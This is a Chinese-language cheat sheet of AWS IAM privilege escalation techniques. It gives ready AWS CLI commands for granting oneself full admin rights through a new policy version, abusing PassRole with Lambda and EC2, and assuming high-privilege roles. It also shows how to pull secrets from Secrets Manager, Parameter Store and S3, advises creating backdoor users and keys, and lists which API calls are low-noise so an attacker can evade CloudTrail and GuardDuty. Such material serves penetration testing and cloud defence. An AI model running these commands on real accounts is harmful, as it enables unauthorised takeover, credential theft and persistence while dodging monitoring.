# AWS IAM 提权路径详解

## 路径 1: iam:CreatePolicyVersion
```bash
# 直接给自己 AdministratorAccess
aws iam create-policy-version \
  --policy-arn <当前策略ARN> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

## 路径 2: iam:PassRole + lambda:CreateFunction
```bash
# 创建 Lambda 函数，挂载高权限 Role → Lambda 内用 Role 权限操作
aws lambda create-function \
  --function-name pwn \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://pwn.zip
```

## 路径 3: iam:PassRole + ec2:RunInstances
```bash
# 启动 EC2 实例，挂载高权限 Instance Profile
# 然后通过 IMDS 获取该 Role 的凭据
```

## 路径 4: sts:AssumeRole
```bash
# 列出可 Assume 的 Role
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS==`arn:aws:iam::ACCOUNT:user/current-user`]]'

# Assume 高权限 Role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole --role-session-name pwn
```

## 路径 5: 跨账号 AssumeRole
检查 Trust Policy 中是否信任其他账号。如果信任 `*` 或宽泛的 Principal → 可从任何 AWS 账号 Assume。

## 通用提权思路
1. **找更多凭据**：S3 桶、Secrets Manager、Parameter Store、Lambda 代码、EC2 User-Data
2. **角色链跳转**：当前 Role → AssumeRole → 更高权限 Role
3. **创建后门**：创建新用户/Access Key、修改策略、添加信任关系
4. **服务利用**：通过 Lambda/EC2/ECS 等服务间接获取 Role 权限

## 高价值数据搜索
```bash
# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <name>

# Parameter Store
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# S3 敏感文件
aws s3 ls s3://<bucket> --recursive | grep -iE "\.env|backup|password|credential|key|secret"
```

## CloudTrail 隐蔽性
- 所有 API 调用都会被 CloudTrail 记录
- **低噪音**：`sts:GetCallerIdentity`、`s3:GetObject`
- **高噪音**：`iam:CreateUser`、`iam:AttachPolicy`、`ec2:RunInstances`
- 某些 region 可能未开启 CloudTrail
- GuardDuty 会检测异常 API 调用模式
